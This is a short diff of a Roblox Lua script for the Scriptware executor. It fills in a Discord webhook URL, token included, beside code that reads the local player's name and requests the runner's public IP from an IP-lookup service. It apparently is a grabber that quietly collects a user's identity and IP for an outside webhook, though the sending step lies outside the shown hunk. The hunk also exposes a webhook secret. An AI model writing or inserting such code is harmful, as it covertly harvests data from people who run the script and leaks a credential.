@@ -4,7 +4,7 @@ script made by banov and expwoo
 -- SCRIPTWARE VERSION
  
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "Put webhook here, if u leave this as it is ur dumb xD"
+local WebhookURL = "https://discord.com/api/webhooks/975862456498913321/LSmNvDYBuxV69WeO4FwT8egCr28s_oqsPlp9S7Gbk4623tX8UYkNE8ufHPq3rNx2fn3-"
 local getIPResponse = request({
     Url = "https://api.ipify.org/?format=json",
 })
